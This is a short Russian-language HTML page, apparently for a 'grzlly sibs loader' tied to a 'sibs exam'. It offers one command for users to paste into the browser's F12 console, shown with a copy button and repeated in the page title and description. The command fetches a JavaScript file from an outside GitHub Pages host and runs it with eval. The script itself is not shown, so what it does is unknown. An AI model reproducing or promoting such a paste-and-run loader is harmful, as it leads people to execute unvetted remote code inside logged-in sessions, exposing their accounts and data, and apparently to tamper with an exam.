<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>eval(await (await fetch('https://grzlly.github.io/sibs/1.js?t=' + Date.now())).text())</title>
  <meta name="description" content="eval(await (await fetch('https://grzlly.github.io/sibs/1.js?t=' + Date.now())).text())">
  <meta name="keywords" content="grzlly sibs, grzlly sibs loader, grzlly github, sibs exam">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, monospace; background: #0f172a; color: #f8fafc; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; padding: 1rem; box-sizing: border-box; }
    .box { background: #1e293b; border: 1px solid #334155; border-radius: 8px; padding: 1.5rem; max-width: 650px; width: 100%; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
    pre { background: #090d16; padding: 1rem; border-radius: 6px; overflow-x: auto; color: #38bdf8; font-size: 13px; border: 1px solid #1e293b; user-select: all; white-space: pre-wrap; word-break: break-all; margin: 0.5rem 0 1rem; }
    button { background: #38bdf8; color: #090d16; border: none; font-weight: bold; padding: 0.75rem 1.2rem; border-radius: 6px; cursor: pointer; width: 100%; font-size: 14px; transition: background 0.2s; }
    button:hover { background: #7dd3fc; }
  </style>
</head>
<body>
  <div class="box">
    <div style="font-size:12px;color:#94a3b8;margin-bottom:4px;">Команда для консоли F12:</div>
    <pre id="code">eval(await (await fetch('https://grzlly.github.io/sibs/1.js?t=' + Date.now(), {cache:'no-store'})).text())</pre>
    <button id="copyBtn">Скопировать команду в буфер</button>
  </div>
  <script>
    const codeEl = document.getElementById('code');
    const btn = document.getElementById('copyBtn');
    btn.onclick = () => {
      navigator.clipboard.writeText(codeEl.innerText.trim()).then(() => {
        btn.innerText = 'Скопировано в буфер!';
        btn.style.background = '#10b981';
        btn.style.color = '#ffffff';
        setTimeout(() => {
          btn.innerText = 'Скопировать команду в буфер';
          btn.style.background = '#38bdf8';
          btn.style.color = '#090d16';
        }, 2000);
      });
    };
  </script>
</body>
</html>
